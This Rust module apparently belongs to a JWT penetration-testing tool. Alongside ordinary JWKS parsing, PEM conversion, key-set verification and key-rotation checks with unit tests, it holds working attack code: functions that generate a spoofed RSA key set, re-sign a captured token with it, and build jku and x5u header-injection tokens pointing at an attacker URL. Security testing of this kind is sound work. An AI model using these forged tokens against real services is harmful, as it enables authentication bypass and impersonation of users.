use anyhow::{anyhow, Result};
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::HashMap;

/// A single JSON Web Key
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Jwk {
    pub kty: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub alg: Option<String>,
    #[serde(default, rename = "use", skip_serializing_if = "Option::is_none")]
    pub key_use: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key_ops: Option<Vec<String>>,
    // RSA parameters
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub n: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub e: Option<String>,
    // EC parameters
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub crv: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub x: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub y: Option<String>,
    // Symmetric key
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub k: Option<String>,
    // x5c certificate chain
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub x5c: Option<Vec<String>>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub x5t: Option<String>,
    #[serde(
        default,
        rename = "x5t#S256",
        skip_serializing_if = "Option::is_none"
    )]
    pub x5t_s256: Option<String>,
    // Catch-all for extra fields
    #[serde(flatten)]
    pub extra: HashMap<String, Value>,
}

/// A JSON Web Key Set
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwkSet {
    pub keys: Vec<Jwk>,
}

/// Result of a spoofed JWKS generation
#[derive(Debug)]
pub struct SpoofedJwks {
    /// The JWKS JSON (public keys)
    pub jwks_json: String,
    /// The private key in PEM format
    pub private_key_pem: String,
    /// A JWT token signed with the spoofed key
    pub signed_token: Option<String>,
}

/// Fetch a JWKS from a remote URL
pub fn fetch_jwks(url: &str) -> Result<JwkSet> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()?;

    let response = client
        .get(url)
        .header("Accept", "application/json")
        .send()
        .map_err(|e| anyhow!("Failed to fetch JWKS from {}: {}", url, e))?;

    if !response.status().is_success() {
        return Err(anyhow!(
            "JWKS endpoint returned status {}: {}",
            response.status(),
            url
        ));
    }

    let jwks: JwkSet = response
        .json()
        .map_err(|e| anyhow!("Failed to parse JWKS response: {}", e))?;

    Ok(jwks)
}

/// Parse a JWKS from a JSON string
pub fn parse_jwks(json_str: &str) -> Result<JwkSet> {
    let jwks: JwkSet =
        serde_json::from_str(json_str).map_err(|e| anyhow!("Failed to parse JWKS: {}", e))?;
    Ok(jwks)
}

/// Convert a JWK RSA public key to PEM format
pub fn jwk_rsa_to_pem(jwk: &Jwk) -> Result<String> {
    if jwk.kty != "RSA" {
        return Err(anyhow!("JWK is not an RSA key (kty: {})", jwk.kty));
    }

    let n = jwk
        .n
        .as_ref()
        .ok_or_else(|| anyhow!("Missing 'n' parameter in RSA JWK"))?;
    let e = jwk
        .e
        .as_ref()
        .ok_or_else(|| anyhow!("Missing 'e' parameter in RSA JWK"))?;

    let n_bytes = URL_SAFE_NO_PAD
        .decode(n)
        .map_err(|e| anyhow!("Failed to decode 'n': {}", e))?;
    let e_bytes = URL_SAFE_NO_PAD
        .decode(e)
        .map_err(|e| anyhow!("Failed to decode 'e': {}", e))?;

    // Build DER-encoded RSA public key
    let der = encode_rsa_public_key_der(&n_bytes, &e_bytes);

    // Wrap in PEM
    let b64 = base64::engine::general_purpose::STANDARD.encode(&der);
    let mut pem = String::from("-----BEGIN PUBLIC KEY-----\n");
    for chunk in b64.as_bytes().chunks(64) {
        pem.push_str(std::str::from_utf8(chunk).unwrap());
        pem.push('\n');
    }
    pem.push_str("-----END PUBLIC KEY-----\n");

    Ok(pem)
}

/// Encode RSA public key components into DER (SubjectPublicKeyInfo) format
fn encode_rsa_public_key_der(n: &[u8], e: &[u8]) -> Vec<u8> {
    // Encode n and e as ASN.1 INTEGERs
    let n_int = asn1_integer(n);
    let e_int = asn1_integer(e);

    // RSAPublicKey ::= SEQUENCE { n INTEGER, e INTEGER }
    let rsa_key_seq = asn1_sequence(&[&n_int, &e_int]);

    // Wrap as BIT STRING
    let mut bit_string_content = vec![0x00]; // no unused bits
    bit_string_content.extend_from_slice(&rsa_key_seq);
    let bit_string = asn1_tag(0x03, &bit_string_content);

    // AlgorithmIdentifier for RSA: OID 1.2.840.113549.1.1.1 + NULL
    let rsa_oid = &[
        0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01,
    ];
    let null = &[0x05, 0x00];
    let algorithm_seq = asn1_sequence(&[rsa_oid, null]);

    // SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey }
    asn1_sequence(&[&algorithm_seq, &bit_string])
}

fn asn1_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut result = vec![tag];
    result.extend_from_slice(&asn1_length(content.len()));
    result.extend_from_slice(content);
    result
}

fn asn1_integer(data: &[u8]) -> Vec<u8> {
    let mut content = Vec::new();
    // Add leading zero if high bit is set (to keep it positive)
    if !data.is_empty() && data[0] & 0x80 != 0 {
        content.push(0x00);
    }
    content.extend_from_slice(data);
    asn1_tag(0x02, &content)
}

fn asn1_sequence(items: &[&[u8]]) -> Vec<u8> {
    let mut content = Vec::new();
    for item in items {
        content.extend_from_slice(item);
    }
    asn1_tag(0x30, &content)
}

fn asn1_length(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len < 256 {
        vec![0x81, len as u8]
    } else {
        vec![0x82, (len >> 8) as u8, len as u8]
    }
}

/// Generate a spoofed JWKS with a new RSA key pair
pub fn generate_spoofed_jwks(
    algorithm: &str,
    kid: Option<&str>,
    token: Option<&str>,
) -> Result<SpoofedJwks> {
    use rsa::pkcs8::EncodePrivateKey;
    use rsa::RsaPrivateKey;

    let alg_upper = algorithm.to_uppercase();
    if !matches!(
        alg_upper.as_str(),
        "RS256" | "RS384" | "RS512" | "PS256" | "PS384" | "PS512"
    ) {
        return Err(anyhow!(
            "JWKS spoofing currently supports RSA algorithms (RS256/RS384/RS512/PS256/PS384/PS512), got: {}",
            algorithm
        ));
    }

    // Generate RSA key pair
    let mut rng = rsa::rand_core::OsRng;
    let bits = 2048;
    let private_key =
        RsaPrivateKey::new(&mut rng, bits).map_err(|e| anyhow!("Failed to generate RSA key: {}", e))?;
    let public_key = private_key.to_public_key();

    // Extract modulus and exponent for JWK
    use rsa::traits::PublicKeyParts;
    let n_bytes = public_key.n().to_bytes_be();
    let e_bytes = public_key.e().to_bytes_be();

    let n_b64 = URL_SAFE_NO_PAD.encode(&n_bytes);
    let e_b64 = URL_SAFE_NO_PAD.encode(&e_bytes);

    let kid_value = kid
        .map(|s| s.to_string())
        .unwrap_or_else(|| format!("spoofed-key-{}", chrono::Utc::now().timestamp()));

    let jwk = Jwk {
        kty: "RSA".to_string(),
        kid: Some(kid_value.clone()),
        alg: Some(algorithm.to_uppercase()),
        key_use: Some("sig".to_string()),
        key_ops: None,
        n: Some(n_b64),
        e: Some(e_b64),
        crv: None,
        x: None,
        y: None,
        k: None,
        x5c: None,
        x5t: None,
        x5t_s256: None,
        extra: HashMap::new(),
    };

    let jwks = JwkSet {
        keys: vec![jwk],
    };

    let jwks_json = serde_json::to_string_pretty(&jwks)?;

    // Export private key as PEM
    let private_key_pem = private_key
        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|e| anyhow!("Failed to export private key: {}", e))?
        .to_string();

    // If a token is provided, re-sign it with the spoofed key
    let signed_token = if let Some(token) = token {
        match sign_token_with_key(token, &private_key_pem, algorithm, Some(&kid_value)) {
            Ok(t) => Some(t),
            Err(_) => None,
        }
    } else {
        None
    };

    Ok(SpoofedJwks {
        jwks_json,
        private_key_pem,
        signed_token,
    })
}

/// Re-sign a JWT token with a given private key, optionally adding kid and jku headers
fn sign_token_with_key(
    token: &str,
    private_key_pem: &str,
    algorithm: &str,
    kid: Option<&str>,
) -> Result<String> {
    // Decode the original token to get claims
    let decoded = crate::jwt::decode(token)?;

    // Build header params
    let mut header_params = HashMap::new();
    if let Some(kid) = kid {
        header_params.insert("kid", kid);
    }

    let options = crate::jwt::EncodeOptions {
        algorithm,
        key_data: crate::jwt::KeyData::PrivateKeyPem(private_key_pem),
        header_params: if header_params.is_empty() {
            None
        } else {
            Some(header_params)
        },
        compress_payload: false,
    };

    crate::jwt::encode_with_options(&decoded.claims, &options)
}

/// Verify a JWT token against all keys in a JWKS
pub fn verify_with_jwks(token: &str, jwks: &JwkSet) -> Result<Vec<KeyVerifyResult>> {
    let mut results = Vec::new();

    for (i, jwk) in jwks.keys.iter().enumerate() {
        let kid = jwk.kid.as_deref().unwrap_or("(none)");

        match jwk.kty.as_str() {
            "RSA" => {
                match jwk_rsa_to_pem(jwk) {
                    Ok(pem) => {
                        let options = crate::jwt::VerifyOptions {
                            key_data: crate::jwt::VerifyKeyData::PublicKeyPem(&pem),
                            validate_exp: false,
                            validate_nbf: false,
                            leeway: 0,
                        };
                        match crate::jwt::verify_with_options(token, &options) {
                            Ok(valid) => {
                                results.push(KeyVerifyResult {
                                    key_index: i,
                                    kid: kid.to_string(),
                                    kty: jwk.kty.clone(),
                                    alg: jwk.alg.clone(),
                                    valid,
                                    error: None,
                                });
                            }
                            Err(e) => {
                                results.push(KeyVerifyResult {
                                    key_index: i,
                                    kid: kid.to_string(),
                                    kty: jwk.kty.clone(),
                                    alg: jwk.alg.clone(),
                                    valid: false,
                                    error: Some(e.to_string()),
                                });
                            }
                        }
                    }
                    Err(e) => {
                        results.push(KeyVerifyResult {
                            key_index: i,
                            kid: kid.to_string(),
                            kty: jwk.kty.clone(),
                            alg: jwk.alg.clone(),
                            valid: false,
                            error: Some(format!("Key conversion failed: {}", e)),
                        });
                    }
                }
            }
            "oct" => {
                if let Some(k) = &jwk.k {
                    match URL_SAFE_NO_PAD.decode(k) {
                        Ok(secret_bytes) => {
                            let secret = String::from_utf8_lossy(&secret_bytes);
                            let options = crate::jwt::VerifyOptions {
                                key_data: crate::jwt::VerifyKeyData::Secret(&secret),
                                validate_exp: false,
                                validate_nbf: false,
                                leeway: 0,
                            };
                            match crate::jwt::verify_with_options(token, &options) {
                                Ok(valid) => {
                                    results.push(KeyVerifyResult {
                                        key_index: i,
                                        kid: kid.to_string(),
                                        kty: jwk.kty.clone(),
                                        alg: jwk.alg.clone(),
                                        valid,
                                        error: None,
                                    });
                                }
                                Err(e) => {
                                    results.push(KeyVerifyResult {
                                        key_index: i,
                                        kid: kid.to_string(),
                                        kty: jwk.kty.clone(),
                                        alg: jwk.alg.clone(),
                                        valid: false,
                                        error: Some(e.to_string()),
                                    });
                                }
                            }
                        }
                        Err(e) => {
                            results.push(KeyVerifyResult {
                                key_index: i,
                                kid: kid.to_string(),
                                kty: jwk.kty.clone(),
                                alg: jwk.alg.clone(),
                                valid: false,
                                error: Some(format!("Failed to decode symmetric key: {}", e)),
                            });
                        }
                    }
                } else {
                    results.push(KeyVerifyResult {
                        key_index: i,
                        kid: kid.to_string(),
                        kty: jwk.kty.clone(),
                        alg: jwk.alg.clone(),
                        valid: false,
                        error: Some("Missing 'k' parameter".to_string()),
                    });
                }
            }
            other => {
                results.push(KeyVerifyResult {
                    key_index: i,
                    kid: kid.to_string(),
                    kty: other.to_string(),
                    alg: jwk.alg.clone(),
                    valid: false,
                    error: Some(format!("Unsupported key type: {}", other)),
                });
            }
        }
    }

    Ok(results)
}

/// Result of verifying a token against a specific key
#[derive(Debug)]
pub struct KeyVerifyResult {
    pub key_index: usize,
    pub kid: String,
    pub kty: String,
    pub alg: Option<String>,
    pub valid: bool,
    pub error: Option<String>,
}

/// Generate JKU/X5U injection payloads with a real spoofed JWKS
pub fn generate_jwks_injection_payloads(
    token: &str,
    attacker_url: &str,
    algorithm: &str,
) -> Result<JwksInjectionResult> {
    let spoofed = generate_spoofed_jwks(algorithm, None, Some(token))?;

    let signed_token = spoofed
        .signed_token
        .ok_or_else(|| anyhow!("Failed to sign token with spoofed key"))?;

    // Decode the signed token to get header/claims parts
    let parts: Vec<&str> = signed_token.split('.').collect();
    if parts.len() != 3 {
        return Err(anyhow!("Invalid signed token format"));
    }

    // Re-encode headers with jku/x5u pointing to attacker URL
    let decoded = crate::jwt::decode(&signed_token)?;
    let claims_part = parts[1];
    let signature_part = parts[2];

    let mut payloads = Vec::new();

    // JKU injection
    let mut jku_header = serde_json::Map::new();
    for (k, v) in &decoded.header {
        jku_header.insert(k.clone(), v.clone());
    }
    jku_header.insert(
        "jku".to_string(),
        Value::String(format!("{}/jwks.json", attacker_url.trim_end_matches('/'))),
    );
    let jku_header_json = serde_json::to_string(&jku_header)?;
    let jku_header_b64 = URL_SAFE_NO_PAD.encode(jku_header_json.as_bytes());
    payloads.push(InjectionPayload {
        header_type: "jku".to_string(),
        token: format!("{}.{}.{}", jku_header_b64, claims_part, signature_part),
        description: format!("JKU injection pointing to {}/jwks.json", attacker_url),
    });

    // X5U injection
    let mut x5u_header = serde_json::Map::new();
    for (k, v) in &decoded.header {
        x5u_header.insert(k.clone(), v.clone());
    }
    x5u_header.insert(
        "x5u".to_string(),
        Value::String(format!("{}/cert.pem", attacker_url.trim_end_matches('/'))),
    );
    let x5u_header_json = serde_json::to_string(&x5u_header)?;
    let x5u_header_b64 = URL_SAFE_NO_PAD.encode(x5u_header_json.as_bytes());
    payloads.push(InjectionPayload {
        header_type: "x5u".to_string(),
        token: format!("{}.{}.{}", x5u_header_b64, claims_part, signature_part),
        description: format!("X5U injection pointing to {}/cert.pem", attacker_url),
    });

    Ok(JwksInjectionResult {
        jwks_json: spoofed.jwks_json,
        private_key_pem: spoofed.private_key_pem,
        payloads,
    })
}

/// Result of JWKS injection payload generation
#[derive(Debug)]
pub struct JwksInjectionResult {
    pub jwks_json: String,
    pub private_key_pem: String,
    pub payloads: Vec<InjectionPayload>,
}

/// A single injection payload
#[derive(Debug)]
pub struct InjectionPayload {
    pub header_type: String,
    pub token: String,
    pub description: String,
}

/// Test key rotation by verifying a token against multiple key files
pub fn test_key_rotation(token: &str, key_paths: &[std::path::PathBuf]) -> Result<Vec<KeyRotationResult>> {
    let mut results = Vec::new();

    for path in key_paths {
        let key_content = std::fs::read_to_string(path)
            .map_err(|e| anyhow!("Failed to read key file {:?}: {}", path, e))?;

        let filename = path
            .file_name()
            .map(|f| f.to_string_lossy().to_string())
            .unwrap_or_else(|| path.display().to_string());

        // Try as public key PEM
        let options = crate::jwt::VerifyOptions {
            key_data: crate::jwt::VerifyKeyData::PublicKeyPem(&key_content),
            validate_exp: false,
            validate_nbf: false,
            leeway: 0,
        };

        match crate::jwt::verify_with_options(token, &options) {
            Ok(valid) => {
                results.push(KeyRotationResult {
                    key_file: filename,
                    valid,
                    error: None,
                });
            }
            Err(_) => {
                // Try as HMAC secret
                let secret_options = crate::jwt::VerifyOptions {
                    key_data: crate::jwt::VerifyKeyData::Secret(key_content.trim()),
                    validate_exp: false,
                    validate_nbf: false,
                    leeway: 0,
                };
                match crate::jwt::verify_with_options(token, &secret_options) {
                    Ok(valid) => {
                        results.push(KeyRotationResult {
                            key_file: filename,
                            valid,
                            error: None,
                        });
                    }
                    Err(e) => {
                        results.push(KeyRotationResult {
                            key_file: filename,
                            valid: false,
                            error: Some(e.to_string()),
                        });
                    }
                }
            }
        }
    }

    Ok(results)
}

/// Result of testing a key in rotation
#[derive(Debug)]
pub struct KeyRotationResult {
    pub key_file: String,
    pub valid: bool,
    pub error: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_jwks() {
        let jwks_json = r#"{
            "keys": [
                {
                    "kty": "RSA",
                    "kid": "test-key-1",
                    "use": "sig",
                    "alg": "RS256",
                    "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
                    "e": "AQAB"
                }
            ]
        }"#;

        let jwks = parse_jwks(jwks_json).unwrap();
        assert_eq!(jwks.keys.len(), 1);
        assert_eq!(jwks.keys[0].kty, "RSA");
        assert_eq!(jwks.keys[0].kid.as_deref(), Some("test-key-1"));
        assert_eq!(jwks.keys[0].alg.as_deref(), Some("RS256"));
    }

    #[test]
    fn test_jwk_rsa_to_pem() {
        let jwk = Jwk {
            kty: "RSA".to_string(),
            kid: Some("test".to_string()),
            alg: Some("RS256".to_string()),
            key_use: Some("sig".to_string()),
            key_ops: None,
            n: Some("0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw".to_string()),
            e: Some("AQAB".to_string()),
            crv: None,
            x: None,
            y: None,
            k: None,
            x5c: None,
            x5t: None,
            x5t_s256: None,
            extra: HashMap::new(),
        };

        let pem = jwk_rsa_to_pem(&jwk).unwrap();
        assert!(pem.contains("-----BEGIN PUBLIC KEY-----"));
        assert!(pem.contains("-----END PUBLIC KEY-----"));
    }

    #[test]
    fn test_parse_jwks_empty() {
        let jwks_json = r#"{"keys": []}"#;
        let jwks = parse_jwks(jwks_json).unwrap();
        assert_eq!(jwks.keys.len(), 0);
    }

    #[test]
    fn test_parse_jwks_invalid_json() {
        let result = parse_jwks("not json");
        assert!(result.is_err());
    }

    #[test]
    fn test_generate_spoofed_jwks() {
        let result = generate_spoofed_jwks("RS256", Some("test-kid"), None);
        assert!(result.is_ok());
        let spoofed = result.unwrap();

        // Verify JWKS structure
        let jwks: JwkSet = serde_json::from_str(&spoofed.jwks_json).unwrap();
        assert_eq!(jwks.keys.len(), 1);
        assert_eq!(jwks.keys[0].kty, "RSA");
        assert_eq!(jwks.keys[0].kid.as_deref(), Some("test-kid"));
        assert!(jwks.keys[0].n.is_some());
        assert!(jwks.keys[0].e.is_some());

        // Verify private key
        assert!(spoofed.private_key_pem.contains("-----BEGIN PRIVATE KEY-----"));
    }

    #[test]
    fn test_generate_spoofed_jwks_with_token() {
        // Create a test token
        let claims = serde_json::json!({"sub": "test", "name": "Test User"});
        let token =
            crate::jwt::encode(&claims, "secret", "HS256").expect("Failed to create test token");

        let result = generate_spoofed_jwks("RS256", Some("test-kid"), Some(&token));
        assert!(result.is_ok());
        let spoofed = result.unwrap();
        assert!(spoofed.signed_token.is_some());
    }

    #[test]
    fn test_generate_spoofed_jwks_unsupported_alg() {
        let result = generate_spoofed_jwks("ES256", None, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_asn1_encoding() {
        // Test basic ASN.1 length encoding
        assert_eq!(asn1_length(0), vec![0x00]);
        assert_eq!(asn1_length(127), vec![0x7f]);
        assert_eq!(asn1_length(128), vec![0x81, 0x80]);
        assert_eq!(asn1_length(255), vec![0x81, 0xff]);
        assert_eq!(asn1_length(256), vec![0x82, 0x01, 0x00]);
    }

    #[test]
    fn test_jwk_rsa_to_pem_non_rsa() {
        let jwk = Jwk {
            kty: "EC".to_string(),
            kid: None,
            alg: None,
            key_use: None,
            key_ops: None,
            n: None,
            e: None,
            crv: Some("P-256".to_string()),
            x: Some("test".to_string()),
            y: Some("test".to_string()),
            k: None,
            x5c: None,
            x5t: None,
            x5t_s256: None,
            extra: HashMap::new(),
        };

        let result = jwk_rsa_to_pem(&jwk);
        assert!(result.is_err());
    }

    #[test]
    fn test_verify_with_jwks_empty() {
        let claims = serde_json::json!({"sub": "test"});
        let token =
            crate::jwt::encode(&claims, "secret", "HS256").expect("Failed to create test token");

        let jwks = JwkSet { keys: vec![] };
        let results = verify_with_jwks(&token, &jwks).unwrap();
        assert!(results.is_empty());
    }

    #[test]
    fn test_key_rotation_with_temp_files() {
        use std::io::Write;
        use tempfile::tempdir;

        let claims = serde_json::json!({"sub": "test"});
        let token =
            crate::jwt::encode(&claims, "my-secret", "HS256").expect("Failed to create test token");

        let dir = tempdir().unwrap();

        // Create key files with different secrets
        let key1_path = dir.path().join("key1.txt");
        let key2_path = dir.path().join("key2.txt");

        std::fs::File::create(&key1_path)
            .unwrap()
            .write_all(b"wrong-secret")
            .unwrap();
        std::fs::File::create(&key2_path)
            .unwrap()
            .write_all(b"my-secret")
            .unwrap();

        let results = test_key_rotation(&token, &[key1_path, key2_path]).unwrap();
        assert_eq!(results.len(), 2);
        assert!(!results[0].valid); // wrong-secret
        assert!(results[1].valid); // my-secret
    }
}
